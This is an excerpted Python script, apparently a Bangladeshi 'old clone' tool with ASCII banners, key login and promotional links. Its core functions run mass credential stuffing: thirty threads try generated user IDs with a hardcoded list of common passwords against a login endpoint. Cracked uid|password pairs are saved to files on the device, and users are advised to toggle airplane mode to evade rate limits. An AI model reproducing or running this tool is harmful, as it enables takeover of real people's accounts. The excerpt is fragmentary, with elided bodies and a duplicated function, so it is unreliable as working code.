...
os.system('clear')
print('\x1b[38;5;46mNIROB x JUBAYET 0.2 SERVER LOADING....\n')

# Optional promotional links
os.system('xdg-open https://youtube.com/@oggyofficial69')
os.system('xdg-open https://www.facebook.com/profile.php?id=100000974981454')
os.system('xdg-open https://github.com/Nirjoynirob69k')
# Install required modules (only if missing)
try:
    import requests
    import httpx
    from bs4 import BeautifulSoup
except ImportError:
    os.system('pip install requests httpx beautifulsoup4')

print('Loading modules...\n')
time.sleep(2)
os.system('clear')
print('\x1b[38;5;46mNIROB x JUBAYET 0.2 SERVER SUCCESSFUL LOGIN....\n')
...
def key_login():
    ...
    while attempts < MAX_ATTEMPTS:
        ...
        if user_key in approved_keys:
            print(f"{GREEN}✅ ACCESS GRANTED! Welcome to NIROB x JUBAYET 0.2 SERVER!{RESET}")
            return True
        else:
            attempts += 1
            print("❌ Invalid key. Try again.")
            if attempts < MAX_ATTEMPTS:
                print(f"⏳ Wait {COOLDOWN_SECONDS} seconds before retrying...\n")
...
# Set window title
sys.stdout.write('\x1b]2;𓆩【NIROB 420】𓆪 \x07')
...
def ____banner____():
    ...
    if 'win' in sys.platform:
        ...
        # NIROB x JUBAYET Clover Logo - Green - Version 2.8
def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
...
\033[1;37m/$$   /$$ /$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$$ 
\033[1;37m| $$$ | $$|_  $$_/| $$__  $$ /$$__  $$| $$__  $$
\033[1;37m| $$$$| $$  | $$  | $$  \ $$| $$  \ $$| $$  \ $$
\033[1;37m| $$ $$ $$  | $$  | $$$$$$$/| $$  | $$| $$$$$$$ 
\033[1;37m| $$  $$$$  | $$  | $$__  $$| $$  | $$| $$__  $$
\033[1;37m| $$\  $$$  | $$  | $$  \ $$| $$  | $$| $$  \ $$
\033[1;37m| $$ \  $$ /$$$$$$| $$  | $$|  $$$$$$/| $$$$$$$/
\033[1;37m|__/  \__/|______/|__/  |__/ \______/ |_______/
                              \033[1;34mNIROB X JUBAYET 0.2
\033[1;35mDeveloped By MOHAMMAD JUBAYET SARKAR FROM PABNA / BD

_______________________ 
  \033[1;31mAuthor  : MOHAMMAD JUBAYET SARKAR
  \033[1;32mYouTube : OGGY-69
  \033[1;33mFacebook: MOHAMMAD JUBAYET SARKAR
  \033[1;34mAdmin   : NIRJOY AHMED NIROB x JUBAYET
_______________________\033[1;32m""")
...
def linex():
    print('\x1b[38;5;48m_______________________')
...
def BNG_71_():
    ...
    linex()
    __Nirob__ = input(f"       \x1b[38;5;196m(\x1b[1;37m👑\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE  {W}: {Y}")
    if __Nirob__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
...
def old_One():
    ...
    with tred(max_workers=30) as pool:
        ...
        print(f"       \x1b[38;5;196m(\x1b[1;37m👑\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOOD FOR BETTER RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
...
def login_1(uid):
    ...
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mNIROB-M1\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('Khan123', 'Khan1122', '12345678', '123456789', '12345678',
           'khan khan', '123456', 'pak123', '57273200', 'khan786', 'pakistan123','nirob123'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
            ...
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mNIROB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/NIROB-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
...
def login_2(uid):
    ...
    """
    sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mNIROB-M2\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        ...
        try:
            with requests.Session() as session:
                ...
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mNIROB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/NIROB-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
